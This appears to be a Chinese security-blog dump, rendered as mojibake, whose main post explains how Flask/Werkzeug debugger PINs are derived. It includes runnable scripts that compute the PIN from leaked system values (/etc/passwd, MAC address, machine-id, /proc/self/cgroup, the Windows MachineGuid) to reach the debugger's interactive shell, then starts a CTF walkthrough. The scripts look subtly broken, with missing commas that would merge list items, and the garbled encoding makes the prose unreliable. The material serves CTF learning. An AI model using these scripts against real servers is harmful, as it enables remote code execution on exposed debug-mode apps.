è§’åº¦ç»™å‡ºåˆ†æï¼šhttps://www.anquanke.com/post/id/240007 pharååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¯¹metadataè¿›è¡Œè§£æçš„æ—¶å€™ä¼šè¿›è¡Œphp_var_unserialize()å°†Pharä¸­çš„metadataè¿›è¡Œååºåˆ—åŒ– 0x06 å‚è€ƒæ–‡ç«  åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢ phpååºåˆ—åŒ–æ‹“å±•æ”»å‡»è¯¦è§£â€“phar php pharååºåˆ—åŒ–æ€»ç»“ Pharä¸Stream Wrapperé€ æˆPHP RCEçš„æ·±å…¥æŒ–æ˜","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"Flask-PINç å­¦ä¹ ","path":"/2023/11/12/flask-pin-ma-xue-xi/","content":"0x01 PINæ˜¯ä»€ä¹ˆ ä»¥ä¸‹çš„ä¸€åˆ‡ç¡¬æ€§çŸ¥è¯†åŸºæœ¬éƒ½æ˜¯ç…§æ¬çš„ï¼ˆå› ä¸ºè‡ªå·±è¿˜å¾ˆèœï¼Œä¸”ä¹Ÿæœªå°è¯•å»è‡ªå·±æ€»ç»“ï¼‰æ•…æ­¤ï¼Œå°±ä»¥ç†è§£åˆ«äººæ–‡ç« ä¸ºå‡†åˆ™äº†ï¼Œè¿˜è¯·è§è°…~ PINæ˜¯ Werkzeugï¼ˆå®ƒæ˜¯ Flask çš„ä¾èµ–é¡¹ä¹‹ä¸€ï¼‰æä¾›çš„é¢å¤–å®‰å…¨æªæ–½ï¼Œä»¥é˜²æ­¢åœ¨ä¸çŸ¥é“ PIN çš„æƒ…å†µä¸‹è®¿é—®è°ƒè¯•å™¨ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨æµè§ˆå™¨ä¸­çš„è°ƒè¯•å™¨å¼•è„šæ¥å¯åŠ¨äº¤äº’å¼è°ƒè¯•å™¨ã€‚ è¯·æ³¨æ„ï¼Œæ— è®ºå¦‚ä½•ï¼Œæ‚¨éƒ½ä¸åº”è¯¥åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨è°ƒè¯•æ¨¡å¼ï¼Œå› ä¸ºé”™è¯¯çš„å †æ ˆè·Ÿè¸ªå¯èƒ½ä¼šæ­ç¤ºä»£ç çš„å¤šä¸ªæ–¹é¢ã€‚ è°ƒè¯•å™¨ PIN åªæ˜¯ä¸€ä¸ªé™„åŠ çš„å®‰å…¨å±‚ï¼Œä»¥é˜²æ‚¨æ— æ„ä¸­åœ¨ç”Ÿäº§åº”ç”¨ç¨‹åºä¸­æ‰“å¼€è°ƒè¯•æ¨¡å¼ï¼Œä»è€Œä½¿æ”»å‡»è€…éš¾ä»¥è®¿é—®è°ƒè¯•å™¨ã€‚ â€”â€”æ¥è‡ªStackOverFlowå›ç­” werkzeugä¸åŒç‰ˆæœ¬ä»¥åŠpythonä¸åŒç‰ˆæœ¬éƒ½ä¼šå½±å“PINç çš„ç”Ÿæˆ ä½†æ˜¯PINç å¹¶ä¸æ˜¯éšæœºç”Ÿæˆï¼Œå½“æˆ‘ä»¬é‡å¤è¿è¡ŒåŒä¸€ç¨‹åºæ—¶ï¼Œç”Ÿæˆçš„PINä¸€æ ·ï¼ŒPINç ç”Ÿæˆæ»¡è¶³ä¸€å®šçš„ç”Ÿæˆç®—æ³• 0x02 æ¢å¯»PINç ç”Ÿæˆç®—æ³• å…ˆå†™ä¸€ä¸ªç®€å•çš„Flaskæµ‹è¯•ç¨‹åº from flask import Flask app = Flask(__name__) @app.route(\"/\") def hello(): return 'hybcx\\'blog' if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=8080, debug=True) è¿è¡Œä¹‹åï¼Œç»“æœå¦‚ä¸‹ è®¿é—®å‘ç°æ­å»ºæˆåŠŸ æ¥ä¸‹æ¥å¼€å§‹è°ƒè¯•ç¨‹åºï¼Œé¡ºè—¤æ‘¸ç“œæ‰¾åˆ°ç”ŸæˆPINç çš„å‡½æ•° PINç æ˜¯werkzeugçš„ç­–ç•¥ï¼Œå…ˆæ‰¾åˆ°flaskä¸­å¯¼å…¥werkzeugçš„éƒ¨åˆ† 2.1 è°ƒè¯• åœ¨run.appè¡Œä¸‹æ–­ç‚¹ï¼Œç‚¹å‡»è°ƒè¯• ç‚¹å‡»æ­¥å…¥ è½¬åˆ°äº†flask/app.pyï¼Œç›´æ¥Ctrl+Fæœç´¢werkzeug å‘ç°ç¨‹åºä»werkzeugå¯¼å…¥äº†run_simpleæ¨¡å—ï¼Œè€Œä¸”tryéƒ¨åˆ†æœ‰run appçš„å‚æ•° æˆ‘ä»¬ç›´æ¥æŒ‰ä½ctrlç‚¹å‡»run_simpleè¿›å»çœ‹çœ‹ æ­¤æ—¶è¿›å…¥äº†seving.pyï¼Œæ‰¾åˆ°äº†è´Ÿè´£Debugçš„éƒ¨åˆ†ï¼ŒPINç æ˜¯åœ¨debugçŠ¶æ€ä¸‹æ‰æœ‰çš„ï¼Œé‚£è¿™ä¸ªéƒ¨åˆ†å¾ˆæœ‰å¯èƒ½å­˜æœ‰PINç ç”Ÿæˆéƒ¨åˆ†ï¼Œè¿›å»çœ‹çœ‹ è¿›å…¥debuggedapplication æ­¤æ—¶è¿›å…¥äº†__init__.pyï¼Œç»è¿‡ä¸€ç•ªå®¡è®¡ï¼Œå…ˆæ¥çœ‹ä¸€çœ‹pinå‡½æ•° @property å°±æ˜¯è´Ÿè´£æŠŠä¸€ä¸ªæ–¹æ³•å˜æˆå±æ€§è°ƒç”¨ï¼Œæ–¹ä¾¿å®šä¹‰å±æ€§çš„ get å’Œ set æ–¹æ³•ã€‚å¯ä»¥çœ‹åˆ°è°ƒç”¨äº† get_pin_and_name() å¯¹ PIN è¿›è¡Œèµ‹å€¼ï¼Œè¿›å»çœ‹çœ‹ï¼Œè¿™é‡Œå°†å‡½æ•°æˆªå–äº†ä¸‹æ¥ def get_pin_and_cookie_name( app: WSGIApplication, ) -&gt; tuple[str, str] | tuple[None, None]: \"\"\"Given an application object this returns a semi-stable 9 digit pin code and a random key. The hope is that this is stable between restarts to not make debugging particularly frustrating. If the pin was forcefully disabled this returns `None`. Second item in the resulting tuple is the cookie name for remembering. \"\"\" # æ ¹æ®ç¯å¢ƒå˜é‡æ£€æŸ¥PINæ˜¯å¦ä¸ºoff(å³è¢«ç¦ç”¨) pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\") rv = None num = None # Pin was explicitly disabled if pin == \"off\": return None, None # Pin was provided explicitly #å¦‚æœPINè®¾ç½®ä¸ºæ²¡æœ‰åˆ†éš”ç¬¦ï¼ˆå¦‚ç ´æŠ˜å·â€œ-â€ï¼‰çš„æ•°å­—å€¼ï¼Œåˆ™å°†å…¶ç”¨ä½œPINã€‚å¦‚æœå­˜åœ¨åˆ†éš”ç¬¦ï¼Œåˆ™ç›´æ¥ä½¿ç”¨PINã€‚å¦åˆ™ï¼Œä½¿ç”¨æä¾›çš„PINçš„ä¿®æ”¹ç‰ˆæœ¬ã€‚ if pin is not None and pin.replace(\"-\", \"\").isdecimal(): # If there are separators in the pin, return it directly if \"-\" in pin: rv = pin else: num = pin #è·å–æœ‰å…³WSGIåº”ç”¨ç¨‹åºæ¨¡å—ï¼ˆappï¼‰å’Œå½“å‰ç”¨æˆ·çš„ä¿¡æ¯ã€‚ modname = getattr(app, \"__module__\", t.cast(object, app).__class__.__module__) username: str | None try: # getuser imports the pwd module, which does not exist in Google # App Engine. It may also raise a KeyError if the UID does not # have a username, such as in Docker. #ä½¿ç”¨getpass.getuser()è·å–ç”¨æˆ·ä¿¡æ¯ã€‚æ­¤ä¿¡æ¯ç”¨äºä½¿Cookieåœ¨è®¡ç®—æœºä¸Šå”¯ä¸€ username = getpass.getuser() except (ImportError, KeyError): username = None mod = sys.modules.get(modname) # This information only exists to make the cookie unique on the # computer, not as a security feature. probably_public_bits = [ username, modname, getattr(app, \"__name__\", type(app).__name__), getattr(mod, \"__file__\", None), ] # This information is here to make it harder for an attacker to # guess the cookie name. They are unlikely to be contained anywhere # within the unauthenticated debug page. private_bits = [str(uuid.getnode()), get_machine_id()] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") #åŸºäºå„ç§ä¿¡æ¯ï¼ˆåŒ…æ‹¬ç”¨æˆ·åã€æ¨¡å—åã€åº”ç”¨ç¨‹åºåå’Œæ¨¡å—æ–‡ä»¶ï¼‰ï¼Œåˆ›å»ºä¸€ä¸ªSHA-1å“ˆå¸Œã€‚æ­¤å“ˆå¸Œç”¨äºç”Ÿæˆä»¥â€œ__wzdâ€å¼€å¤´çš„å”¯ä¸€Cookieåç§°ã€‚ cookie_name = f\"__wzd{h.hexdigest()[:20]}\" # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits #å¦‚æœæœªæ˜¾å¼æä¾›PINï¼Œå®ƒé€šè¿‡å¯¹ä¸€äº›ä¿¡æ¯è¿›è¡Œå“ˆå¸Œå¹¶å°†å…¶è½¬æ¢ä¸º9ä½æ•°å­—å­—ç¬¦ä¸²æ¥ç”ŸæˆPINã€‚è¿™æ ·åšæ˜¯ä¸ºäº†ç¡®ä¿PINåœ¨é‡æ–°å¯åŠ¨æ—¶ç›¸å¯¹ç¨³å®šã€‚ if num is None: h.update(b\"pinsalt\") num = f\"{int(h.hexdigest(), 16):09d}\"[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. #å°†PINæ ¼å¼åŒ–ä¸ºæ•°å­—ç»„ï¼ˆ5ã€4å’Œ3ä½æ•°å­—ï¼‰ï¼Œä»¥ä¾¿ç”¨æˆ·æ›´å®¹æ˜“è®°ä½ã€‚ç„¶åè¿”å›æ ¼å¼åŒ–çš„PINå’Œç”Ÿæˆçš„Cookieåç§°ã€‚ if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num return rv, cookie_name è¿”å›çš„rvå°±æ˜¯PINç ï¼Œä½†è¿™ä¸ªå‡½æ•°æ ¸å¿ƒæ˜¯å°†åˆ—è¡¨é‡Œçš„å€¼hashï¼Œæˆ‘ä»¬ä¸éœ€è¦å»è¯»æ‡‚è¿™æ®µä»£ç ï¼Œåªéœ€è¦å°†åˆ—è¡¨é‡Œçš„å€¼å¡«ä¸Šç›´æ¥è¿è¡Œä»£ç å°±è¡Œã€‚ è™½ç„¶è¿™ä½ç¬”è€…å‘ŠçŸ¥æˆ‘ä»¬ä¸éœ€è¦è¯»æ‡‚ï¼Œä½†æ±‚çŸ¥å¿ƒåˆ‡çš„æˆ‘å†³å®šè·Ÿç€GPTè¿‡ä¸€é 2.2 ç”Ÿæˆè¦ç´ ï¼š username é€šè¿‡getpass.getuser()è¯»å–ï¼Œé€šè¿‡æ–‡ä»¶è¯»å–`/etc/passwd`-- å¯åŠ¨è¿™ä¸ªflaskçš„ç”¨æˆ· modname é€šè¿‡getattr(mod,\"__file__\",None)è¯»å–ï¼Œé»˜è®¤å€¼ä¸ºflask.app appname é€šè¿‡getattr(app,\"__name__\",type(app).__name__)è¯»å–ï¼Œé»˜è®¤å€¼ä¸ºFlask æˆ– é€šè¿‡getattr(app, \"__name__\", app.__class__.__name__)è¯»å– moddir å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ï¼Œé€šè¿‡getattr(mod,\"__file__\",None)è¯»å–å®é™…åº”ç”¨ä¸­é€šè¿‡æŠ¥é”™è¯»å– uuidnode é€šè¿‡uuid.getnode()è¯»å–ï¼Œé€šè¿‡æ–‡ä»¶`/sys/class/net/eth0/address`å¾—åˆ°16è¿›åˆ¶ç»“æœï¼Œè½¬åŒ–ä¸º10è¿›åˆ¶è¿›è¡Œè®¡ç®— machine_id æ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œmachine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š 1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup å½“è¿™6ä¸ªå€¼æˆ‘ä»¬å¯ä»¥è·å–åˆ°æ—¶ï¼Œå°±å¯ä»¥æ¨ç®—å‡ºç”Ÿæˆçš„PINç  åˆ°è¿™å„¿å‚æ•°çš„æ¥å†éƒ½æ¸…æ¥šäº†ï¼Œåšä¸ªæ€»ç»“ probably_public_bits = [ username è¿è¡Œå½“å‰ç¨‹åºçš„ç”¨æˆ·å modname å½“å‰å¯¹è±¡çš„æ¨¡å—åï¼Œé»˜è®¤ä¸ºflask.app getattr(app, \"__name__\", app.__class__.__name__) å½“å‰å¯¹è±¡çš„åç§°ï¼Œé»˜è®¤ä¸ºFlask getattr(mod, \"__file__\", None) flaskåŒ…å†…çš„app.pyçš„ç»å¯¹è·¯å¾„ ] private_bits = [ str(uuid.getnode()) Macåœ°å€çš„æ•´å‹ï¼Œé€šè¿‡int(Mac, 16)å¯ä»¥è·å– get_machine_id() [ docker /proc/self/cgroupï¼Œæ­£åˆ™åˆ†å‰² Linux /etc/machine-idï¼Œ/proc/sys/kernl/random/boot_idï¼Œå‰è€…å›ºå®šåè€…ä¸å›ºå®š macOS ioreg -c IOPlatformExpertDevice -d 2ä¸­\"serial-number\" = &lt;{ID}éƒ¨åˆ† Windows æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid ] ] 2.3 PINç”Ÿæˆç®—æ³• ç„¶åè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œpythonä¸åŒç‰ˆæœ¬çš„ç®—æ³•åŒºåˆ«ï¼Œ3.6é‡‡ç”¨MD5åŠ å¯†ï¼Œ3.8é‡‡ç”¨sha1åŠ å¯†ï¼Œæ‰€ä»¥è„šæœ¬æœ‰æ‰€ä¸åŒ sha1è®¡ç®— #sha1 import hashlib from itertools import chain probably_public_bits = [ 'root'# /etc/passwd 'flask.app',# é»˜è®¤å€¼ 'Flask',# é»˜è®¤å€¼ '/usr/local/lib/python3.8/site-packages/flask/app.py' # æŠ¥é”™å¾—åˆ° ] private_bits = [ '2485377581187',# /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶ #machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'# /proc/self/cgroup ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) MD5è®¡ç®— #MD5 import hashlib from itertools import chain probably_public_bits = [ 'flaskweb'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ '25214234362297',# str(uuid.getnode()), /sys/class/net/eth0/address '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) å…¶å®æœ€ç¨³å¦¥çš„æ–¹æ³•å°±æ˜¯è‡ªå·±è°ƒè¯•ï¼ŒæŠŠè‡ªå·±ç‰ˆæœ¬çš„ç”ŸæˆPINéƒ¨åˆ†æå–å‡ºæ¥ï¼ŒæŠŠnumå’Œrvæ”¹æˆNoneï¼Œç›´æ¥print rvå°±è¡Œ 0x03 PINç è·å– 3.1 Linuxä¸‹PINç è·å– è¿˜æ˜¯ç”¨ä¸Šé¢æµç¨‹åˆ†æçš„ä»£ç ï¼Œåœ¨ linux ä¸­è¿è¡Œã€‚ uaername å¯ä»¥ä» /etc/passwd ä¸­è¯»å–ã€‚è¿™é‡Œæ˜¯ root ç”¨æˆ·å¯åŠ¨çš„ï¼Œæ‰€ä»¥å€¼ä¸º rootï¼Œä¸çŸ¥é“å“ªä¸ªç”¨æˆ·å¯åŠ¨çš„ï¼Œå¯ä»¥æŒ‰ç…§ /etc/passwd é‡Œçš„ç”¨æˆ·å¤šå°è¯•ä¸€ä¸‹ã€‚ getattr(mod, '__file__', None) flask ç›®å½•ä¸‹çš„ä¸€ä¸ª app.py çš„ç»å¯¹è·¯å¾„,è¿™ä¸ªå€¼å¯ä»¥åœ¨æŠ¥é”™é¡µé¢çœ‹åˆ°ã€‚ä½†æœ‰ä¸ªéœ€æ³¨æ„ï¼Œpython3 æ˜¯ app.pyï¼Œpython2 ä¸­æ˜¯ app.pycã€‚è¿™é‡Œå€¼ä¸º /usr/local/lib/python2.7/dist-packages/flask/app.pyc ä½†æ˜¯å¦‚ä½•æ‰èƒ½äº§ç”ŸæŠ¥é”™ï¼Œä¼¼ä¹æ²¡äººè®²å•Šã€‚ã€‚ã€‚ã€‚ str(uuid.getnode()) MACåœ°å€ è¯»å–è¿™ä¸¤ä¸ªåœ°å€ï¼š/sys/class/net/eth0/address æˆ–è€… /sys/class/net/ens33/address è½¬åŒ–ä¸º10è¿›åˆ¶ï¼Œè¿™é‡Œå€¼ä¸º52235878851 get_machine_id() ç³»ç»Ÿid ã€‚ æˆ‘ä»¬è¿›å…¥get_machine_id()ï¼Œä»ä»£ç ä¸­å¯ä»¥å¾—çŸ¥è¿™é‡Œå¯¹linuxã€macosã€windowçš„3ç§ç³»ç»Ÿçš„è·å–æ–¹æ³•ã€‚ def get_machine_id(): global _machine_id if _machine_id is not None: return _machine_id def _generate(): linux = b\"\" # machine-id is stable across boots, boot_id is not. for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\": try: with open(filename, \"rb\") as f: value = f.readline().strip() except IOError: continue if value: linux += value break # Containers share the same machine id, add some cgroup # information. This is used outside containers too but should be # relatively stable across boots. try: with open(\"/proc/self/cgroup\", \"rb\") as f: linux += f.readline().strip().rpartition(b\"/\")[2] except IOError: pass if linux: return linux # On OS X, use ioreg to get the computer's serial number. try: # subprocess may not be available, e.g. Google App Engine # https://github.com/pallets/werkzeug/issues/925 from subprocess import Popen, PIPE dump = Popen( [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE ).communicate()[0] match = re.search(b'\"serial-number\" = &lt;([^&gt;]+)', dump) if match is not None: return match.group(1) except (OSError, ImportError): pass # On Windows, use winreg to get the machine guid. try: import winreg as wr except ImportError: try: import _winreg as wr except ImportError: wr = None if wr is not None: try: with wr.OpenKey( wr.HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\Microsoft\\\\Cryptography\", 0, wr.KEY_READ | wr.KEY_WOW64_64KEY, ) as rk: guid, guid_type = wr.QueryValueEx(rk, \"MachineGuid\") if guid_type == wr.REG_SZ: return guid.encode(\"utf-8\") return guid except WindowsError: pass _machine_id = _generate() return _machine_id åªè¦ä» /etc/machine-idã€/proc/sys/kernel/random/boot_id ä¸­è¯»åˆ°ä¸€ä¸ªå€¼åç«‹å³ breakï¼Œç„¶åå’Œ/proc/self/cgroup ä¸­çš„idå€¼æ‹¼æ¥ 2020.1.5å¯¹ machine_id() è¿›è¡Œäº†æ›´æ–° ï¼Œæ‰€ä»¥2020.1.5ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯è·Ÿè¿™é‡Œä¸åŒçš„ï¼Œå…·ä½“æ›´æ–°æƒ…å†µå¯çœ‹ https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f 2020.1.5ä¿®æ”¹å‰æ˜¯ï¼š æ˜¯ä¾åºè¯»å– /proc/self/cgroupã€/etc/machine-idã€/proc/sys/kernel/random/boot_id ä¸‰ä¸ªæ–‡ä»¶ï¼Œåªè¦è¯»å–åˆ°ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œ ç«‹é©¬è¿”å›å€¼ã€‚ è¿™é‡Œ /etc/machine-id ä¸º 75d03aa852be476cbe73544c93e98276 ï¼Œ`` åªè¯»å–ç¬¬ä¸€è¡Œï¼Œå¹¶ä»¥ä»å³è¾¹ç®—èµ·çš„ç¬¬ä¸€ ä¸ªâ€˜/â€™ä¸ºåˆ†éš”ç¬¦ï¼Œåˆ†æˆä¸¤éƒ¨åˆ†ï¼Œå–å³è¾¹é‚£éƒ¨åˆ†ï¼Œè¿™é‡Œä¸ºç©ºï¼Œæ‰€ä»¥è¿™é‡Œ get_machine_id() çš„å€¼ä¸º 75d03aa852be476cbe73544c93e98276ã€‚ ç°åœ¨å·²ç»çŸ¥é“æ‰€æœ‰å˜é‡çš„å€¼ï¼Œå¯ä»¥å°±ç”¨ get_pin_and_cookie_name çš„éƒ¨åˆ†ä»£ç ç”ŸæˆPINç ã€‚ import hashlib from itertools import chain probably_public_bits = [ 'root'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None), ] private_bits = [ '52228526895',# str(uuid.getnode()), /sys/class/net/ens33/address '75d03aa852be476cbe73544c93e98276'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) æœ€åç”Ÿæˆçš„ PIN ç ä¸º638-233-100ï¼Œè¾“å…¥åå³å¯çœ‹åˆ°ä¸€ä¸ª shell çš„äº¤äº’ç•Œé¢ 3.2 Windowsä¸‹PINç è·å– uaername å¯ä»¥ä»net userå‘½ä»¤æŸ¥çœ‹ï¼Œè¿™é‡Œå€¼ä¸º Administrator getattr(mod, '__file__', None) flask ç›®å½•ä¸‹çš„ä¸€ä¸ª app.py çš„ç»å¯¹è·¯å¾„,è¿™ä¸ªå€¼å¯ä»¥åœ¨æŠ¥é”™é¡µé¢çœ‹åˆ°ã€‚ä½†æœ‰ä¸ªéœ€æ³¨æ„ï¼Œpython3 æ˜¯ app.pyï¼Œpython2 ä¸­æ˜¯ app.pycã€‚è¿™é‡Œå€¼ä¸ºG:\\code\\venv\\flaskProject2\\lib\\site-packages\\flask\\app.pyc str(uuid.getnode()) MAC åœ°å€ ipconfig /all è½¬åŒ–ä¸º10è¿›åˆ¶ï¼Œè¿™é‡Œå€¼ä¸º123360440651610 get_machine_id() ç³»ç»Ÿ id ã€‚ æ‰“å¼€æ³¨å†Œè¡¨æŸ¥çœ‹\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptographyçš„ MachineGuid å€¼ ä¹Ÿå¯ä»¥ç”¨ reg å‘½ä»¤è¡ŒæŸ¥è¯¢ reg query HKLM\\SOFTWARE\\Microsoft\\Cryptography è¿™é‡Œå€¼ä¸º178b0ab8-5a99-4c8e-828d-efc7a40b7f08ï¼Œæœ€åç”¨ä¸Šé¢çš„è„šæœ¬ç”ŸæˆPINï¼Œç»“æœå°è¯•äº†ä¸€ä¸‹æ˜¯é”™äº†ã€‚ é‡æ–°è°ƒè¯•äº†ä¸€ä¸‹è„šæœ¬ï¼Œå‘ç° str(uuid.getnode()) çš„MACåœ°å€ä¸å¯¹ï¼Œæœ¬æœºä¸Šæœ‰å¤šä¸ªç½‘å¡ï¼Œæ‰€ä»¥æœ‰å¤šä¸ª MAC åœ°å€ï¼Œä»¥ä¸ºæ˜¯ uuid.getnode() è·å–çš„æ˜¯å½“å‰æ­£åœ¨çš„ç½‘å¡çš„MACåœ°å€ã€‚çœ‹äº†ä¸€ä¸‹ uuid.getnode() çš„åº•å±‚å®ç°æºç ï¼Œæ‰çŸ¥é“ï¼Œå®ƒæ˜¯æ‰§è¡Œäº† ipconfig /all,æ ¹æ®è¿”å›çš„ç»“æœï¼Œé€è¡Œåœ°å»æ­£åˆ™åŒ¹é… MAC åœ°å€ï¼Œç¬¬ä¸€ä¸ªåŒ¹é…æˆåŠŸå°±è¿”å›ã€‚ æ‰€ä»¥ä»–è¿™é‡Œç¬¬ä¸€ä¸ªè¿”å›çš„MACåœ°å€ä¸º7C-B2-7D-23-D7-E5ï¼Œè½¬åŒ–ä¸ºåè¿›åˆ¶åä¸º137106045523941ï¼Œæœ€åç”Ÿæˆçš„PINç ä¸º296-090-416 3.3 æ€»ç»“ pinç éœ€è¦å…­ä¸ªå‚æ•° 1. è¿è¡Œå½“å‰ç¨‹åºçš„ç”¨æˆ·åï¼Œå¯ä»¥é€šè¿‡/etc/passwdå°è¯• 2. å¯¹è±¡appçš„__module__å±æ€§ï¼Œæ²¡æœ‰åˆ™ä»ç±»ä¸­å–ï¼Œé»˜è®¤ä¸ºflask.app 3. å¯¹è±¡appçš„__name__å±æ€§ï¼Œæ²¡æœ‰åˆ™ä»ç±»ä¸­å–ï¼Œé»˜è®¤ä¸ºFlask 4. flaskåŒ…ä¸­çš„appæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œpython2ä¸ºpycï¼Œé»˜è®¤ä¸º/usr/local/lib/python{ç‰ˆæœ¬å·}/site-packages/flask/app.py 5. Macåœ°å€çš„æ•´å‹ 6. æœºå™¨ID docker /proc/self/cgroupï¼Œæ­£åˆ™åˆ†å‰² Linux /etc/machine-idï¼Œ/proc/sys/kernl/random/boot_idï¼Œå‰è€…å›ºå®šåè€…ä¸å›ºå®š macOS ioreg -c IOPlatformExpertDevice -d 2ä¸­\"serial-number\" = &lt;{ID}éƒ¨åˆ† Windows æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptography-&gt;MachineGuid åŠ å¯†æ–¹å¼ python2ç»å¤§éƒ¨åˆ†ä¸ºmd5åŠ å¯†ï¼Œpython3å°‘éƒ¨åˆ†ä¸ºmd5ï¼Œå¤§éƒ¨åˆ†ä¸ºsha1åŠ å¯† æœºå™¨idè¯»å–é¡ºåºä¸åŒ 0.15.5ä¹‹å‰ /etc/machine-id`-&gt;`/proc/sys/kernel/random/boot_id`-&gt;`ioreg -c IOPlatformExpertDevice -d 2`-&gt;`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid 0.15.5-0.16.0 /proc/self/cgroup`-&gt;`/etc/machine-id`-&gt;`/proc/sys/kernel/random/boot_id`-&gt;`ioreg -c IOPlatformExpertDevice -d 2`-&gt;`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid /proc/self/cgroupéœ€è¦ç”¨æ­£åˆ™value.strip().partition(\"/docker/\")[2]åˆ†å‰² 0.16.0ä¹‹å /etc/machine-id`-&gt;`/proc/sys/kernel/random/boot_id`-&gt;`/proc/self/cgroup`-&gt;`ioreg -c IOPlatformExpertDevice -d 2`-&gt;`HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid /proc/self/cgroupéœ€è¦ç”¨æ­£åˆ™f.readline().strip().rpartition(b\"/\")[2]åˆ†å‰² 0x04 å®æˆ˜ä¾‹é¢˜ [CISCN2019 åä¸œå—èµ›åŒº]Double Secret æœ¬æ¥ä¿¡å¿ƒæ»¡æ»¡çš„æ‰“å¼€é¢˜ç›®å»ç»ƒä¹ ä¸€ç•ªï¼Œç»“æœè¿™é“é¢˜çš„å‰æœŸæˆ‘å°±æ‡µé€¼å‘¢ï¼Œçœ‹äº†wpä¹Ÿæ˜¯ä½©æœè„‘æ´ è®¿é—®é¦–é¡µè¿™é‡Œè¯´è®©æˆ‘ä»¬å»æ‰¾Secretï¼Œäºæ˜¯å°è¯•ç›´æ¥è®¿é—®secretè·¯ç”± è¿™é‡Œåˆå‘Šè¯‰æˆ‘ä»¬ï¼šè®©æˆ‘ä»¬å‘Šè¯‰ä»–secretï¼Œä»–ä¼šåŠ å¯†ã€‚äºæ˜¯é‚£äº›ä½¬ä¸çŸ¥ä½•ç§æ€è·¯ï¼Œå¯¹è¿™secretè¿›è¡Œäº†getä¼ å‚ã€‚ã€‚ã€‚ è¿™é‡Œæˆ‘èƒ¡ä¹±ä¼ äº†ä¸€ä¸ªæ•°å€¼ï¼Œå‘ç°é¡µé¢æŠ¥é”™ï¼Œè¿™æ„Ÿæƒ…å¥½å•Šï¼Œè‚¯å®šdebugå¼€å¯äº† 